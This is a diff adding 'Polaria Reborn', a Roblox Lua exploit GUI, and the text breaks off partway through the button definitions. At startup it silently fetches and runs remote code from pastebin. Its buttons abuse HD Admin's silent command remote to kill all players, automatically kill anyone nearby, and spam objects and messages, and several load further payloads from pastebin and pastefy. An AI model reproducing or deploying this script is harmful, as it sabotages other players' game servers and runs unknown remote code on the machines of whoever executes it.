@@ -1,0 +1,601 @@
+--Polaria Reborn By D47K
+task.spawn(function()
+loadstring(game:HttpGet("https://pastebin.com/raw/CnHVyrbr"))()
+end)
+
+local main = Instance.new("ScreenGui")
+local icon = Instance.new("Frame")
+local top = Instance.new("Frame")
+local title = Instance.new("TextLabel")
+local close = Instance.new("TextButton")
+local maximize = Instance.new("TextButton")
+local minimize = Instance.new("TextButton")
+local Holder = Instance.new("Frame")
+local Home = Instance.new("TextButton")
+local Server = Instance.new("TextButton")
+local Scripts = Instance.new("TextButton")
+local serverpage = Instance.new("Frame")
+local UnAnchor = Instance.new("TextButton")
+local c00lkidd = Instance.new("TextButton")
+local BasePlate = Instance.new("TextButton")
+local KillAll = Instance.new("TextButton")
+local ClearTerrain = Instance.new("TextButton")
+local Disco = Instance.new("TextButton")
+local Anti = Instance.new("TextButton")
+local rain = Instance.new("TextButton")
+local lego = Instance.new("TextButton")
+local r6 = Instance.new("TextButton")
+local workspace = Instance.new("TextButton")
+local _63x = Instance.new("TextButton")
+local tornado = Instance.new("TextButton")
+local shutdown = Instance.new("TextButton")
+local nokick = Instance.new("TextButton")
+local song = Instance.new("TextButton")
+local destroy = Instance.new("TextButton")
+local ban = Instance.new("TextButton")
+local flood = Instance.new("TextButton")
+local explode = Instance.new("TextButton")
+local fog = Instance.new("TextButton")
+local heli = Instance.new("TextButton")
+local invis = Instance.new("TextButton")
+local smok = Instance.new("TextButton")
+local pe = Instance.new("TextButton")
+local fling = Instance.new("TextButton")
+local scriptspage = Instance.new("Frame")
+local ssp = Instance.new("TextButton")
+local nzi = Instance.new("TextButton")
+local hax1 = Instance.new("TextButton")
+local hax2 = Instance.new("TextButton")
+local ship = Instance.new("TextButton")
+local noot = Instance.new("TextButton")
+local sledoni = Instance.new("TextButton")
+local sledoniyong = Instance.new("TextButton")
+local grand = Instance.new("TextButton")
+local exca = Instance.new("TextButton")
+local r6_2 = Instance.new("TextButton")
+local primadon = Instance.new("TextButton")
+local topkek = Instance.new("TextButton")
+local subspace = Instance.new("TextButton")
+local bom2 = Instance.new("TextButton")
+local pistol = Instance.new("TextButton")
+local topkek5 = Instance.new("TextButton")
+local mosque = Instance.new("TextButton")
+local MLG = Instance.new("TextButton")
+local hung = Instance.new("TextButton")
+local trshhyub = Instance.new("TextButton")
+local gkv1 = Instance.new("TextButton")
+local uzi = Instance.new("TextButton")
+local guns = Instance.new("TextButton")
+local stra = Instance.new("TextButton")
+local k0p = Instance.new("TextButton")
+local infiniteyield = Instance.new("TextButton")
+local exser = Instance.new("TextButton")
+local nextpage = Instance.new("TextButton")
+local Executor = Instance.new("TextButton")
+local executorpage = Instance.new("Frame")
+local input = Instance.new("TextBox")
+local exec = Instance.new("TextButton")
+local clear = Instance.new("TextButton")
+local hey = Instance.new("TextLabel")
+local idk = Instance.new("TextLabel")
+local Output = Instance.new("TextButton")
+local outputpage = Instance.new("Frame")
+local MainComponent = Instance.new("ScrollingFrame")
+local output = Instance.new("TextBox")
+local clear_2 = Instance.new("TextButton")
+local homepage = Instance.new("Frame")
+local br = Instance.new("TextLabel")
+local user = Instance.new("TextLabel")
+local br2 = Instance.new("TextLabel")
+local age = Instance.new("TextLabel")
+local br3 = Instance.new("TextLabel")
+local f = Instance.new("TextLabel")
+local user_2 = Instance.new("ImageLabel")
+local svrtime = Instance.new("TextLabel")
+local realtime = Instance.new("TextLabel")
+local jobid = Instance.new("TextLabel")
+local placeid = Instance.new("TextLabel")
+local idk_2 = Instance.new("TextLabel")
+local progress = Instance.new("TextLabel")
+local scriptspage3 = Instance.new("Frame")
+local mosque_2 = Instance.new("TextButton")
+local blast = Instance.new("TextButton")
+local bomb = Instance.new("TextButton")
+local map = Instance.new("TextButton")
+local decal = Instance.new("TextButton")
+local obunga = Instance.new("TextButton")
+local rc7 = Instance.new("TextButton")
+local beforepage = Instance.new("TextButton")
+local nextpage_2 = Instance.new("TextButton")
+local scriptspage2 = Instance.new("Frame")
+local omni = Instance.new("TextButton")
+local destructiong = Instance.new("TextButton")
+local beforepage_2 = Instance.new("TextButton")
+local IDE = Instance.new("TextButton")
+local mystic = Instance.new("TextButton")
+local dog = Instance.new("TextButton")
+local mosque_3 = Instance.new("TextButton")
+local ssp2 = Instance.new("TextButton")
+local laser = Instance.new("TextButton")
+local china = Instance.new("TextButton")
+local bean = Instance.new("TextButton")
+local patrik = Instance.new("TextButton")
+local kitchen = Instance.new("TextButton")
+local virus = Instance.new("TextButton")
+local rocky = Instance.new("TextButton")
+local yield = Instance.new("TextButton")
+local cina = Instance.new("TextButton")
+local mc = Instance.new("TextButton")
+local c4 = Instance.new("TextButton")
+local summon = Instance.new("TextButton")
+local bv = Instance.new("TextButton")
+local ploit = Instance.new("TextButton")
+local hamer = Instance.new("TextButton")
+local baby = Instance.new("TextButton")
+local kik = Instance.new("TextButton")
+local c0l = Instance.new("TextButton")
+local nds = Instance.new("TextButton")
+local cart = Instance.new("TextButton")
+local GK = Instance.new("TextButton")
+local nextpage_3 = Instance.new("TextButton")
+local ambientShadow = Instance.new("ImageLabel")
+local penumbraShadow = Instance.new("ImageLabel")
+local umbraShadow = Instance.new("ImageLabel")
+local UIDragdetector = Instance.new("UIDragDetector")
+
+local minimized = false
+local maximized = false
+local normalTopSize = top.Size
+local normalTopPos = top.Position
+
+main.Name = "main"
+main.Parent = game.CoreGui
+main.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+main.ResetOnSpawn = false
+
+top.Name = "top"
+top.Parent = main
+top.Active = true
+top.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+top.BorderColor3 = Color3.fromRGB(129, 26, 255)
+top.BorderSizePixel = 2
+top.Position = UDim2.new(0.325987846, 0, 0.334872991, 0)
+top.Size = UDim2.new(0, 457, 0, 29)
+top.ZIndex = 0
+
+UIDragdetector.Parent = top
+
+title.Name = "title"
+title.Parent = top
+title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+title.BackgroundTransparency = 1.000
+title.BorderColor3 = Color3.fromRGB(0, 0, 0)
+title.BorderSizePixel = 0
+title.Position = UDim2.new(0.0153172864, 0, 0, 0)
+title.Size = UDim2.new(0, 187, 0, 29)
+title.Font = Enum.Font.Nunito
+title.Text = "POLARIA"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 19.000
+title.TextWrapped = true
+title.TextXAlignment = Enum.TextXAlignment.Left
+
+close.Name = "close"
+close.Parent = top
+close.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+close.BorderColor3 = Color3.fromRGB(129, 26, 255)
+close.BorderSizePixel = 2
+close.Position = UDim2.new(0.93654269, 0, 0, 0)
+close.Size = UDim2.new(0, 29, 0, 29)
+close.Font = Enum.Font.Arial
+close.Text = "X"
+close.TextColor3 = Color3.fromRGB(255, 255, 255)
+close.TextSize = 23.000
+close.TextWrapped = true
+close.MouseButton1Click:Connect(function()
+main:Destroy()
+end)
+
+maximize.Name = "maximize"
+maximize.Parent = top
+maximize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+maximize.BorderColor3 = Color3.fromRGB(129, 26, 255)
+maximize.BorderSizePixel = 2
+maximize.Position = UDim2.new(0.87308532, 0, 0, 0)
+maximize.Size = UDim2.new(0, 29, 0, 29)
+maximize.Font = Enum.Font.Arial
+maximize.Text = "🗖"
+maximize.TextColor3 = Color3.fromRGB(255, 255, 255)
+maximize.TextSize = 23.000
+maximize.TextWrapped = true
+maximize.MouseButton1Click:Connect(function()
+top.Position = UDim2.new(0.653, 0, 0.364, 0)
+end)
+
+minimize.Name = "minimize"
+minimize.Parent = top
+minimize.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+minimize.BorderColor3 = Color3.fromRGB(129, 26, 255)
+minimize.BorderSizePixel = 2
+minimize.Position = UDim2.new(0.80962801, 0, 0, 0)
+minimize.Size = UDim2.new(0, 29, 0, 29)
+minimize.Font = Enum.Font.Arial
+minimize.Text = "-"
+minimize.TextColor3 = Color3.fromRGB(255, 255, 255)
+minimize.TextSize = 37.000
+minimize.TextWrapped = true
+minimize.MouseButton1Click:Connect(function()
+minimized = not minimized
+Holder.Visible = not minimized
+end)
+
+Holder.Name = "Holder"
+Holder.Parent = top
+Holder.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Holder.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Holder.BorderSizePixel = 2
+Holder.Position = UDim2.new(0, 0, 1, 0)
+Holder.Size = UDim2.new(0, 457, 0, 311)
+
+local function show(page)
+if page then
+page.Visible = true
+end
+end
+local function hide(page)
+if page then
+page.Visible = false
+end
+end
+
+Home.Name = "Home"
+Home.Parent = Holder
+Home.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Home.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Home.BorderSizePixel = 2
+Home.Size = UDim2.new(0, 107, 0, 29)
+Home.Font = Enum.Font.Arial
+Home.Text = "Home"
+Home.TextColor3 = Color3.fromRGB(255, 255, 255)
+Home.TextSize = 18.000
+Home.TextWrapped = true
+Home.MouseButton1Click:Connect(function()
+show(homepage)
+hide(serverpage)
+hide(scriptspage)
+hide(executorpage)
+hide(outputpage)
+end)
+
+Server.Name = "Server"
+Server.Parent = Holder
+Server.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Server.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Server.BorderSizePixel = 2
+Server.Position = UDim2.new(0.234135672, 0, 0, 0)
+Server.Size = UDim2.new(0, 103, 0, 29)
+Server.Font = Enum.Font.Arial
+Server.Text = "Server\\Local"
+Server.TextColor3 = Color3.fromRGB(255, 255, 255)
+Server.TextSize = 18.000
+Server.TextWrapped = true
+Server.MouseButton1Click:Connect(function()
+hide(homepage)
+show(serverpage)
+hide(scriptspage)
+hide(executorpage)
+hide(outputpage)
+end)
+
+Scripts.Name = "Scripts"
+Scripts.Parent = Holder
+Scripts.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Scripts.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Scripts.BorderSizePixel = 2
+Scripts.Position = UDim2.new(0.459518611, 0, 0, 0)
+Scripts.Size = UDim2.new(0, 89, 0, 29)
+Scripts.Font = Enum.Font.Arial
+Scripts.Text = "Scripts"
+Scripts.TextColor3 = Color3.fromRGB(255, 255, 255)
+Scripts.TextSize = 18.000
+Scripts.TextWrapped = true
+Scripts.MouseButton1Click:Connect(function()
+hide(homepage)
+hide(serverpage)
+show(scriptspage)
+hide(executorpage)
+hide(outputpage)
+end)
+
+serverpage.Name = "serverpage"
+serverpage.Parent = Holder
+serverpage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+serverpage.BackgroundTransparency = 1.000
+serverpage.BorderColor3 = Color3.fromRGB(0, 0, 0)
+serverpage.BorderSizePixel = 0
+serverpage.Position = UDim2.new(0, 0, 0.0996784568, 0)
+serverpage.Size = UDim2.new(0, 457, 0, 280)
+serverpage.Visible = false
+
+UnAnchor.Name = "UnAnchor"
+UnAnchor.Parent = serverpage
+UnAnchor.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+UnAnchor.BorderColor3 = Color3.fromRGB(129, 26, 255)
+UnAnchor.BorderSizePixel = 2
+UnAnchor.Position = UDim2.new(0.0306345727, 0, 0.0357142873, 0)
+UnAnchor.Size = UDim2.new(0, 104, 0, 29)
+UnAnchor.Font = Enum.Font.Arial
+UnAnchor.Text = "UnAnchor"
+UnAnchor.TextColor3 = Color3.fromRGB(255, 255, 255)
+UnAnchor.TextSize = 18.000
+UnAnchor.TextWrapped = true
+UnAnchor.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local tool = backpack:FindFirstChild("Building Tools")
+
+if tool then
+    wait (0)
+else
+    rq:InvokeServer(";btools")
+end
+
+loadstring(game:HttpGet('https://pastebin.com/raw/nLdnURwp',true))()
+end)
+
+c00lkidd.Name = "c00lkidd"
+c00lkidd.Parent = serverpage
+c00lkidd.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+c00lkidd.BorderColor3 = Color3.fromRGB(129, 26, 255)
+c00lkidd.BorderSizePixel = 2
+c00lkidd.Position = UDim2.new(0.271334797, 0, 0.0357142873, 0)
+c00lkidd.Size = UDim2.new(0, 104, 0, 29)
+c00lkidd.Font = Enum.Font.Arial
+c00lkidd.Text = "C00LKIDD"
+c00lkidd.TextColor3 = Color3.fromRGB(255, 255, 255)
+c00lkidd.TextSize = 18.000
+c00lkidd.TextWrapped = true
+c00lkidd.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local tool = backpack:FindFirstChild("Building Tools")
+
+if tool then
+    wait (0)
+else
+    rq:InvokeServer(";btools")
+end
+
+loadstring(game:HttpGet("https://pastefy.app/cWGor0lN/raw"))()
+loadstring(game:HttpGet("https://pastefy.app/eiKaOEdA/raw"))()
+rq:InvokeServer(";sh C00L KIDD STUFFS ON YOU LOLL!!!!!!! TEAM C00LKIDD JOIN TODAY!")
+loadstring(game:HttpGet('https://pastebin.com/raw/nLdnURwp',true))()
+end)
+
+BasePlate.Name = "BasePlate"
+BasePlate.Parent = serverpage
+BasePlate.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+BasePlate.BorderColor3 = Color3.fromRGB(129, 26, 255)
+BasePlate.BorderSizePixel = 2
+BasePlate.Position = UDim2.new(0.512035012, 0, 0.0357142873, 0)
+BasePlate.Size = UDim2.new(0, 104, 0, 29)
+BasePlate.Font = Enum.Font.Arial
+BasePlate.Text = "Baseplate"
+BasePlate.TextColor3 = Color3.fromRGB(255, 255, 255)
+BasePlate.TextSize = 18.000
+BasePlate.TextWrapped = true
+BasePlate.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local tool = backpack:FindFirstChild("Building Tools")
+
+if tool then
+    wait (0)
+else
+    rq:InvokeServer(";btools")
+end
+
+loadstring(game:HttpGet("https://pastefy.app/YrWzyhby/raw"))()
+end)
+
+KillAll.Name = "Kill All"
+KillAll.Parent = serverpage
+KillAll.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+KillAll.BorderColor3 = Color3.fromRGB(129, 26, 255)
+KillAll.BorderSizePixel = 2
+KillAll.Position = UDim2.new(0.752735257, 0, 0.0357142873, 0)
+KillAll.Size = UDim2.new(0, 99, 0, 29)
+KillAll.Font = Enum.Font.Arial
+KillAll.Text = "Kill All"
+KillAll.TextColor3 = Color3.fromRGB(255, 255, 255)
+KillAll.TextSize = 18.000
+KillAll.TextWrapped = true
+KillAll.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+rq:InvokeServer(";kill all")
+end)
+
+ClearTerrain.Name = "Clear Terrain"
+ClearTerrain.Parent = serverpage
+ClearTerrain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ClearTerrain.BorderColor3 = Color3.fromRGB(129, 26, 255)
+ClearTerrain.BorderSizePixel = 2
+ClearTerrain.Position = UDim2.new(0.0306345727, 0, 0.160714284, 0)
+ClearTerrain.Size = UDim2.new(0, 104, 0, 29)
+ClearTerrain.Font = Enum.Font.Arial
+ClearTerrain.Text = "Clear Terrain"
+ClearTerrain.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearTerrain.TextSize = 18.000
+ClearTerrain.TextWrapped = true
+ClearTerrain.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local tool = backpack:FindFirstChild("Building Tools")
+
+if tool then
+    wait (0)
+else
+    rq:InvokeServer(";btools")
+end
+
+loadstring(game:HttpGet("https://pastefy.app/psSFNsX2/raw"))()
+end)
+
+Disco.Name = "Disco"
+Disco.Parent = serverpage
+Disco.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Disco.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Disco.BorderSizePixel = 2
+Disco.Position = UDim2.new(0.271334797, 0, 0.160714284, 0)
+Disco.Size = UDim2.new(0, 104, 0, 29)
+Disco.Font = Enum.Font.Arial
+Disco.Text = "Disco"
+Disco.TextColor3 = Color3.fromRGB(255, 255, 255)
+Disco.TextSize = 18.000
+Disco.TextWrapped = true
+Disco.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local tool = backpack:FindFirstChild("Building Tools")
+
+if tool then
+    wait (0)
+else
+    rq:InvokeServer(";btools")
+end
+
+loadstring(game:HttpGet("https://pastefy.app/Xt7oQTrX/raw"))()
+end)
+
+Anti.Name = "Anti"
+Anti.Parent = serverpage
+Anti.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Anti.BorderColor3 = Color3.fromRGB(129, 26, 255)
+Anti.BorderSizePixel = 2
+Anti.Position = UDim2.new(0.512035012, 0, 0.160714284, 0)
+Anti.Size = UDim2.new(0, 104, 0, 29)
+Anti.Font = Enum.Font.Arial
+Anti.Text = "Anti-Robloxian"
+Anti.TextColor3 = Color3.fromRGB(255, 255, 255)
+Anti.TextSize = 18.000
+Anti.TextWrapped = true
+Anti.MouseButton1Click:Connect(function()
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+local KillDistance = 17
+local KilledAlready = {}
+local function KillPlayer(player)
+if not KilledAlready[player] then
+KilledAlready[player] = true
+rq:InvokeServer(";kill " .. player.Name)
+end
+end
+local function CheckDistance()
+local myChar = LocalPlayer.Character
+if not myChar or not myChar:FindFirstChild("HumanoidRootPart") then return end
+for _, player in ipairs(Players:GetPlayers()) do
+if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+local dist = (myChar.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
+if dist <= KillDistance then
+KillPlayer(player)
+end
+else
+KilledAlready[player] = nil 
+end
+end
+end
+RunService.RenderStepped:Connect(CheckDistance)
+end)
+
+rain.Name = "rain"
+rain.Parent = serverpage
+rain.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+rain.BorderColor3 = Color3.fromRGB(129, 26, 255)
+rain.BorderSizePixel = 2
+rain.Position = UDim2.new(0.752735257, 0, 0.160714284, 0)
+rain.Size = UDim2.new(0, 99, 0, 29)
+rain.Font = Enum.Font.Arial
+rain.Text = "Bomb Rain"
+rain.TextColor3 = Color3.fromRGB(255, 255, 255)
+rain.TextSize = 18.000
+rain.TextWrapped = true
+rain.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+
+local player = game.Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+
+local tool = backpack:FindFirstChild("Building Tools")
+
+if tool then
+    wait (0)
+else
+    rq:InvokeServer(";btools")
+end
+
+loadstring(game:HttpGet("https://pastefy.app/8msU9LK6/raw"))()
+end)
+
+lego.Name = "lego"
+lego.Parent = serverpage
+lego.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+lego.BorderColor3 = Color3.fromRGB(129, 26, 255)
+lego.BorderSizePixel = 2
+lego.Position = UDim2.new(0.752735257, 0, 0.285714298, 0)
+lego.Size = UDim2.new(0, 99, 0, 29)
+lego.Font = Enum.Font.Arial
+lego.Text = "Bricks"
+lego.TextColor3 = Color3.fromRGB(255, 255, 255)
+lego.TextSize = 18.000
+lego.TextWrapped = true
+lego.MouseButton1Click:Connect(function()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local rq = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+rq:InvokeServer(";insert 56453012")
+wait(0.1)
+rq:InvokeServer(";insert 56453012")
+wait(0.1)
+rq:InvokeServer(";insert 56453012")
+wait(0.1)
+rq:InvokeServer(";insert 56453012")
+wait(1)
+rq:InvokeServer(";insert 56453012")
+wait(0.1)
+rq:InvokeServer(";insert 56453012")
+wait(0.1)
+rq:InvokeServer(";insert 56453012")
+wait(0.1)
+rq:InvokeServer(";insert 56453012")
+end)
+
+r6.Name = "r6"
+r6.Parent = serverpage
+r6.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+r6.BorderColor3 = Color3.fromRGB(129, 26, 255)
+r6.BorderSizePixel = 2
+r6.Position = UDim2.new(0.512035012,
